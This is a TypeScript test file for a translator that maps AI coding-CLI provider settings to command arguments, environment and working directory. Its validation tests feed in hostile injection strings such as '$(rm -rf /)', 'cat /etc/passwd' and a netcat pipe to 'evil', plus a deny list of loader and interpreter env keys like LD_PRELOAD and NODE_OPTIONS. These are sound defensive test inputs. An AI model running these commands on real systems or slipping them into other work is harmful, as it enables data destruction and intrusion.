/**
 * M4.5.a — provider config translator tests.
 */
import test from "node:test";
import assert from "node:assert/strict";
import { translateProviderConfig, providerConfigSchema } from "../../../src/runtime/providers/config-translator";
import { AppError } from "../../../src/shared/errors";

const baseConfig = providerConfigSchema.parse({});

test("translates the canonical claude triple to argv + env + cwd", () => {
  const out = translateProviderConfig({
    provider: "claude",
    providerVersion: "1.2.3",
    model: "claude-opus-4",
    accountMode: "authenticated",
    config: {
      binaryArgs: ["--strict-json"],
      envOverrides: { MINIMAL_LOG_LEVEL: "debug" },
      workingDirectory: "/tmp/proj",
    },
  });
  assert.deepEqual(out.argv, [
    "--provider-version", "1.2.3",
    "--model", "claude-opus-4",
    "--account-mode", "authenticated",
    "--strict-json",
  ]);
  assert.deepEqual(out.env, { MINIMAL_LOG_LEVEL: "debug" });
  assert.equal(out.cwd, "/tmp/proj");
});

test("translates the canonical codex triple using --version (not --provider-version)", () => {
  const out = translateProviderConfig({
    provider: "codex",
    providerVersion: "0.5.1",
    model: "codex-mini",
    accountMode: "anonymous",
    config: { binaryArgs: [], envOverrides: {}, workingDirectory: null },
  });
  assert.deepEqual(out.argv, [
    "--version", "0.5.1",
    "--model", "codex-mini",
  ]);
  // No --account-mode for codex (mirrors the M4.1 stub surface).
  assert.equal(out.argv.includes("--account-mode"), false);
});

test("rejects binaryArgs with embedded shell metacharacters", () => {
  for (const bad of ["echo; cat /etc/passwd", "$(rm -rf /)", "`whoami`", "x | nc evil 1", "x & y"]) {
    assert.throws(
      () => translateProviderConfig({
        provider: "claude",
        providerVersion: "1.0",
        model: "m",
        accountMode: "trusted-host",
        config: { binaryArgs: [bad], envOverrides: {}, workingDirectory: null },
      }),
      (err: unknown) => err instanceof AppError && err.failure.code === "INVALID_REQUEST",
      `expected ${JSON.stringify(bad)} to be refused`,
    );
  }
});

test("rejects envOverrides keys starting with LD_, DYLD_, NODE_, PYTHON", () => {
  for (const bad of ["LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "NODE_OPTIONS", "PYTHONPATH"]) {
    assert.throws(
      () => translateProviderConfig({
        provider: "claude",
        providerVersion: "1.0",
        model: "m",
        accountMode: "trusted-host",
        config: { binaryArgs: [], envOverrides: { [bad]: "evil" }, workingDirectory: null },
      }),
      (err: unknown) => err instanceof AppError && err.failure.code === "INVALID_REQUEST",
      `expected ${bad} to be refused`,
    );
  }
  // Keys that merely **contain** a forbidden substring (not at the start) are allowed.
  const ok = translateProviderConfig({
    provider: "claude",
    providerVersion: "1.0",
    model: "m",
    accountMode: "trusted-host",
    config: { binaryArgs: [], envOverrides: { MINIMAL_LD_DEBUG: "1" }, workingDirectory: null },
  });
  assert.equal(ok.env.MINIMAL_LD_DEBUG, "1");
});

test("empty config (defaults only) is backwards-compatible with M4.1", () => {
  const out = translateProviderConfig({
    provider: "claude",
    providerVersion: "1.0",
    model: "m",
    accountMode: "authenticated",
    config: baseConfig,
  });
  assert.deepEqual([...out.argv], [
    "--provider-version", "1.0",
    "--model", "m",
    "--account-mode", "authenticated",
  ]);
  assert.deepEqual({ ...out.env }, {});
  assert.equal(out.cwd, null);
});

test("workingDirectory: null yields cwd: null (caller inherits)", () => {
  const out = translateProviderConfig({
    provider: "claude",
    providerVersion: "1.0",
    model: "m",
    accountMode: "authenticated",
    config: { binaryArgs: [], envOverrides: {}, workingDirectory: null },
  });
  assert.equal(out.cwd, null);
});

test("translation is deterministic — same input produces identical output", () => {
  const req = {
    provider: "claude" as const,
    providerVersion: "1.0.0",
    model: "m",
    accountMode: "authenticated" as const,
    config: { binaryArgs: ["--strict-json"], envOverrides: { X: "1" }, workingDirectory: "/tmp" },
  };
  const a = translateProviderConfig(req);
  const b = translateProviderConfig(req);
  assert.deepEqual([...a.argv], [...b.argv]);
  assert.deepEqual({ ...a.env }, { ...b.env });
  assert.equal(a.cwd, b.cwd);
});

test("unknown config keys raise INVALID_REQUEST (.strict())", () => {
  assert.throws(
    () => translateProviderConfig({
      provider: "claude",
      providerVersion: "1.0",
      model: "m",
      accountMode: "authenticated",
      config: {
        // The schema forbids this; it must not pass through.
        binaryArgs: [],
        envOverrides: {},
        workingDirectory: null,
        // @ts-expect-error -- intentionally invalid for the test.
        rogueKey: "x",
      },
    }),
    (err: unknown) => err instanceof AppError && err.failure.code === "INVALID_REQUEST",
  );
});
